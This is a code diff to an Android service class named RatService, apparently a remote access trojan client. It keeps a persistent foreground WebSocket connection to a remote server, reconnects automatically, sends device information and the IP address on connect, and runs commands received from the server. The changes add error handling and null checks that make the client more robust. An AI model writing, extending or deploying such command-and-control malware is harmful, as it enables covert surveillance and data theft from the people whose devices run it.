@@ -4,15 +4,12 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.util.Log;
-
-import androidx.annotation.NonNull;
 
 import org.json.JSONObject;
 
@@ -56,7 +53,6 @@ public class RatService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Foreground
         Notification.Builder b;
         if (Build.VERSION.SDK_INT >= 26)
             b = new Notification.Builder(this, CH);
@@ -78,19 +74,24 @@ public class RatService extends Service {
     }
 
     private void connect() {
-        Request req = new Request.Builder().url(SERVER_URL).build();
-        ws = client.newWebSocket(req, new WSListener());
+        try {
+            Request req = new Request.Builder().url(SERVER_URL).build();
+            ws = client.newWebSocket(req, new WSListener());
+        } catch (Throwable t) {
+            Log.e(TAG, "connect error", t);
+            scheduleReconnect();
+        }
     }
 
     private class WSListener extends WebSocketListener {
         @Override
-        public void onOpen(@NonNull WebSocket webSocket, @NonNull Response response) {
-            Log.i(TAG, "Connected to server");
+        public void onOpen(WebSocket webSocket, Response response) {
+            Log.i(TAG, "Connected");
             sendHello();
         }
 
         @Override
-        public void onMessage(@NonNull WebSocket webSocket, @NonNull String text) {
+        public void onMessage(WebSocket webSocket, String text) {
             try {
                 JSONObject obj = new JSONObject(text);
                 String type = obj.optString("type");
@@ -102,7 +103,7 @@ public class RatService extends Service {
                     String cmd = obj.optString("cmd");
                     handleCommand(cmd);
                 } else if ("pong".equals(type)) {
-                    Log.i(TAG, "Pong received");
+                    Log.i(TAG, "Pong");
                 }
             } catch (Throwable t) {
                 Log.e(TAG, "parse error", t);
@@ -110,23 +111,26 @@ public class RatService extends Service {
         }
 
         @Override
-        public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, Response response) {
-            Log.e(TAG, "Connection failed: " + t.getMessage());
+        public void onFailure(WebSocket webSocket, Throwable t, Response response) {
+            Log.e(TAG, "failed: " + t.getMessage());
             scheduleReconnect();
         }
 
         @Override
-        public void onClosed(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
-            Log.i(TAG, "Closed: " + reason);
+        public void onClosed(WebSocket webSocket, int code, String reason) {
+            Log.i(TAG, "closed: " + reason);
             scheduleReconnect();
         }
     }
 
     private void scheduleReconnect() {
-        reconnectHandler.postDelayed(() -> {
-            if (running) {
-                Log.i(TAG, "Reconnecting...");
-                connect();
+        reconnectHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (running) {
+                    Log.i(TAG, "Reconnecting...");
+                    connect();
+                }
             }
         }, 5000);
     }
@@ -139,7 +143,7 @@ public class RatService extends Service {
             hello.put("type", "hello");
             hello.put("device", info);
             hello.put("ip", ip);
-            ws.send(hello.toString());
+            if (ws != null) ws.send(hello.toString());
         } catch (Throwable t) {
             Log.e(TAG, "hello error", t);
         }
@@ -147,15 +151,13 @@ public class RatService extends Service {
 
     private void handleCommand(String cmd) {
         Log.i(TAG, "Command: " + cmd);
-
         try {
             if (cmd.equals("/ping")) {
                 sendResult(cmd, "pong");
             } else if (cmd.equals("/info")) {
-                String info = DeviceInfo.getInfoJson(RatService.this);
-                sendResult(cmd, info);
+                sendResult(cmd, DeviceInfo.getInfoJson(RatService.this));
             } else {
-                sendResult(cmd, "unknown command");
+                sendResult(cmd, "unknown");
             }
         } catch (Throwable t) {
             sendResult(cmd, "error: " + t.getMessage());
@@ -169,7 +171,7 @@ public class RatService extends Service {
             obj.put("id", myId);
             obj.put("cmd", cmd);
             obj.put("result", result);
-            ws.send(obj.toString());
+            if (ws != null) ws.send(obj.toString());
         } catch (Throwable t) {
             Log.e(TAG, "sendResult error", t);
         }
@@ -183,7 +185,7 @@ public class RatService extends Service {
         running = false;
         reconnectHandler.removeCallbacksAndMessages(null);
         if (ws != null) {
-            ws.close(1000, "service stopped");
+            ws.close(1000, "stopped");
             ws = null;
         }
         super.onDestroy();
